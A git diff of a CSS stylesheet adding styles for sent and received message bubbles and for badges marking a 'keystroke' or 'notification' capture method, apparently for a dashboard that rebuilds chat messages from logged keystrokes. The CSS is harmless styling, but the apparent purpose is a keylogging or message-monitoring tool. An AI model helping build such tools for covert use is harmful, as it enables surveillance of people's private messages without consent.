@@ -5551,6 +5551,72 @@ body {
   border: 1px solid rgba(252, 129, 129, 0.3);
 }
 
+/* SENT vs RECEIVED message styles (Hybrid Keystroke + Notification) */
+.message-bubble.sent {
+  align-self: flex-end;
+  background: linear-gradient(135deg, #3d8bfd 0%, #0d6efd 100%);
+  color: white;
+  border-radius: 16px 16px 4px 16px;
+  margin-left: auto;
+}
+
+.message-bubble.sent .message-text {
+  color: white;
+}
+
+.message-bubble.sent .message-time {
+  color: rgba(255, 255, 255, 0.7);
+}
+
+.message-bubble.sent .message-type {
+  color: rgba(255, 255, 255, 0.6);
+}
+
+.message-bubble.received {
+  align-self: flex-start;
+  background: var(--surface-light);
+  border-radius: 16px 16px 16px 4px;
+}
+
+/* Capture method badge */
+.capture-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 4px;
+  font-size: 0.65rem;
+  padding: 2px 6px;
+  border-radius: 4px;
+  margin-left: 8px;
+  vertical-align: middle;
+}
+
+.capture-badge.keystroke {
+  background: rgba(16, 185, 129, 0.15);
+  color: #10b981;
+}
+
+.capture-badge.notification {
+  background: rgba(99, 102, 241, 0.15);
+  color: #6366f1;
+}
+
+/* Message type indicator */
+.message-direction {
+  font-size: 0.7rem;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  margin-bottom: 4px;
+}
+
+.message-direction.sent {
+  color: #3d8bfd;
+}
+
+.message-direction.received {
+  color: #10b981;
+}
+
 /* ====================================
    WhatsApp-Style Chat View for Keystrokes
    ==================================== */
